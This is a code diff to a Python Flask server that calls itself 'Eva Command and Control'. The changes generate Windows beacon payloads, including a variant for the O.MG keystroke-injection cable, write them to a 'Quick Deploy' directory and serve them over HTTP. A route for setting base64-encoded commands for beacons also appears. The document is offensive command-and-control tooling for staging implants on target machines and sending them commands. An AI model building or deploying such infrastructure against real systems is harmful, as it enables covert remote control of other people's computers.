@@ -27,12 +27,16 @@ else:
     from deploy_beacon import get_local_ip
     server_url = f"http://{get_local_ip()}:8000"
 
-beacon_code = deploy_beacon.generate_http_cmd(server_url)
+beacon_code = deploy_beacon.generate_http_win_cmd(server_url)
 
-print("\n[*] Execute this command on Windows target via O.MG or command prompt:\n")
-print(beacon_code.strip() + "\n\n")
-
-print(f"More beacons can be found in the server's local /qd/ (Quick Deploy) directory.\n\n")
+print("\n" + "=" * 50)
+print("[!] Welcome to Eva Command and Control")
+print("=" * 50)
+print("[*] Beacon payloads have been generated in:")
+print("    → http://localhost:8000/qd\n")
+print("[*] Example payload for Windows (run via CMD):\n")
+print(beacon_code.strip())
+print("\n" + "=" * 50 + "\n")
 
 @app.route("/cmd/<b64>", methods=["GET"])
 def set_cmd(b64):
@@ -138,10 +142,6 @@ def serve_qd_file(filename):
     qd_path = os.path.join(current_dir, "qd")
     return send_from_directory(qd_path, filename)
 
-def write_qd(path, content):
-    with open(path, "w", encoding="utf-8") as f:
-        f.write(content.strip())
-
 @app.route("/qd", methods=["GET"])
 def list_qd_files():
     if request.remote_addr != "127.0.0.1":
@@ -149,16 +149,31 @@ def list_qd_files():
 
     qd_path = os.path.join(current_dir, "qd")
     try:
-        files = os.listdir(qd_path)
+        files = []
+        for root, _, filenames in os.walk(qd_path):
+            for name in filenames:
+                rel_path = os.path.relpath(os.path.join(root, name), qd_path)
+                # Filter out hidden files (those starting with ".")
+                if not any(part.startswith(".") for part in rel_path.split(os.sep)):
+                    files.append(rel_path)
         if not files:
             return Response("[No payloads available]", mimetype="text/plain")
-        listing = "\n".join(f"http://{request.host}/qd/{f}" for f in files)
+        listing = "\n".join(f"{server_url}/qd/{f}\n" for f in files)
         return Response(listing, mimetype="text/plain")
     except Exception as e:
         return Response(f"[!] Error: {e}", mimetype="text/plain")
 
-write_qd(current_dir + '/qd/qd_http.cmd', beacon_code)
-write_qd(current_dir + '/qd/qd_http.py', deploy_beacon.generate_http_python(server_url))
+def write_qd(path, content):
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(content.strip())
+
+write_qd(f'{current_dir}/qd/http_win.cmd',
+         deploy_beacon.generate_http_win_cmd(server_url))
+write_qd(f'{current_dir}/qd/http_all.py',
+         deploy_beacon.generate_http_all_python(server_url))
+write_qd(f'{current_dir}/qd/OMG/http_win_cmd.txt',
+         deploy_beacon.generate_omg_http_win_cmd(server_url))
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
